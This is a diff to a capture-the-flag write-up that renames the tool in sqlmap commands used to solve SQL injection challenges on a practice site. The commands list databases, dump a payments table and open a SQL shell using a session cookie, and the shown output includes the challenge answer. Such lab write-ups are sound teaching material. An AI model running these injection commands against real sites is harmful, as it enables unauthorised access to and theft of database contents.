@@ -145,7 +145,7 @@ The 'Rent a Boat' was the database that used a different database. You could sel
 
 As you had to log in to get to the member's area, you will need to use a cookie. The cookie will contain your session that authorises you to access this page. You can find your cookie value using the developer tools in your web browser, make sure to copy the whole value to provide to SQLMap.
 
-To find the name of this database you could use the command `sqlmap.py -u "https://sql.cybersoc.org.uk/members/rent?category=Jet+Ski" --cookie "<COOKIE_VALUE>" -dbs`. This would give the output:
+To find the name of this database you could use the command `sqlmap -u "https://sql.cybersoc.org.uk/members/rent?category=Jet+Ski" --cookie "<COOKIE_VALUE>" -dbs`. This would give the output:
 ```
 available databases [3]:
 [*] geordie_boat_rentals_ltd
@@ -171,9 +171,9 @@ __Answer:__ 569221
 
 __Solution:__
 
-Using the 'Rent a Boat' page from [question 5](#question-5), you could use the command `sqlmap.py -u "https://sql.cybersoc.org.uk/members/rent?category=Jet+Ski" --cookie "<COOKIE_VALUE>" -D geordie_boat_rentals_ltd -T payments --dump` to see what the table contained.
+Using the 'Rent a Boat' page from [question 5](#question-5), you could use the command `sqlmap -u "https://sql.cybersoc.org.uk/members/rent?category=Jet+Ski" --cookie "<COOKIE_VALUE>" -D geordie_boat_rentals_ltd -T payments --dump` to see what the table contained.
 
-This would have returned 126 rows from the table. Just using the dump command is not enough to find the sum of all the money in the `payments` table. To easily calculate the sum, you could run the command `sqlmap.py -u "https://sql.cybersoc.org.uk/members/rent?category=Jet+Ski" --cookie "<COOKIE_VALUE>" --sql-shell`. This would open a SQL shell, which you could run SQL commands.
+This would have returned 126 rows from the table. Just using the dump command is not enough to find the sum of all the money in the `payments` table. To easily calculate the sum, you could run the command `sqlmap -u "https://sql.cybersoc.org.uk/members/rent?category=Jet+Ski" --cookie "<COOKIE_VALUE>" --sql-shell`. This would open a SQL shell, which you could run SQL commands.
 
 In the SQL shell, you could run the SQL command `SELECT SUM(money) FROM payments;`. This would return the sum of the money, __569221__, contained in the money column of the `payments` table.
 
